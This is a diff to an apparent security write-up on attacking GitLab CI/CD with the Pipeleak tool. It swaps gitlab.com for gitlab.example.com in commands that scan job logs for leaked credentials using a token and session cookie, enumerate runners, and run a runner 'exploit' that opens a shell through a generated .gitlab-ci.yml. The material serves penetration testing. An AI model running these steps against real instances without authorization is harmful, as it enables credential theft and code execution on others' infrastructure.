@@ -132,7 +132,7 @@ There are many reasons why credentials might be included in the job output. More
 [Pipeleak](https://github.com/CompassSecurity/pipeleak) can be used to scan for credentials in the job outputs.
 
 ```bash
-$ pipeleak scan --token glpat-[redacted] --gitlab https://gitlab.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high 
+$ pipeleak scan --token glpat-[redacted] --gitlab https://gitlab.example.com -c [gitlab session cookie]]  -v -a -j 5 --confidence high-verified,high 
 2024-09-26T13:47:09+02:00 DBG Verbose log output enabled
 2024-09-26T13:47:10+02:00 INF Gitlab Version Check revision=2e166256199 version=17.5.0-pre
 2024-09-26T13:47:10+02:00 DBG Setting up queue on disk
@@ -208,7 +208,7 @@ Runners can be attached globally, on the group level or on individual projects.
 
 Using pipeleak we can automate runner enumeration:
 ```bash
-$ pipeleak runners --token glpat-[redacted] --gitlab https://gitlab.com -v list
+$ pipeleak runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v list
 2024-09-26T14:26:54+02:00 INF group runner description=2-green.shared-gitlab-org.runners-manager.gitlab.com name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org type=instance_type
 2024-09-26T14:26:55+02:00 INF group runner description=3-green.shared-gitlab-org.runners-manager.gitlab.com/dind name=comp-test-ia paused=false runner=gitlab-runner tags=gitlab-org-docker type=instance_type
 2024-09-26T14:26:55+02:00 INF group runner description=blue-3.saas-linux-large-amd64.runners-manager.gitlab.com/default name=comp-test-ia paused=false runner=gitlab-runner tags=saas-linux-large-amd64 type=instance_type
@@ -223,7 +223,7 @@ Pipeleak can generate a `.gitlab-ci.yml` or directly create a project and launch
 
 ```bash
 # Manual creation
-$ pipeleak runners --token glpat-[redacted] --gitlab https://gitlab.com -v exploit --tags saas-linux-small-amd64 --shell --dry
+$ pipeleak runners --token glpat-[redacted] --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell --dry
 2024-09-26T14:32:26+02:00 DBG Verbose log output enabled
 2024-09-26T14:32:26+02:00 INF Generated .gitlab-ci.yml
 2024-09-26T14:32:26+02:00 INF ---
@@ -249,7 +249,7 @@ pipeleak-job-saas-linux-small-amd64:
 2024-09-26T14:32:26+02:00 INF Done, Bye Bye 🏳️‍🌈🔥
 
 # Automated
-$ pipeleak runners --token glpat-[redacted]  --gitlab https://gitlab.com -v exploit --tags saas-linux-small-amd64 --shell 
+$ pipeleak runners --token glpat-[redacted]  --gitlab https://gitlab.example.com -v exploit --tags saas-linux-small-amd64 --shell 
 2024-09-26T14:33:48+02:00 DBG Verbose log output enabled
 2024-09-26T14:33:49+02:00 INF Created project name=pipeleak-runner-exploit url=https://gitlab.com/[redacted]/pipeleak-runner-exploit
 2024-09-26T14:33:50+02:00 INF Created .gitlab-ci.yml file=.gitlab-ci.yml
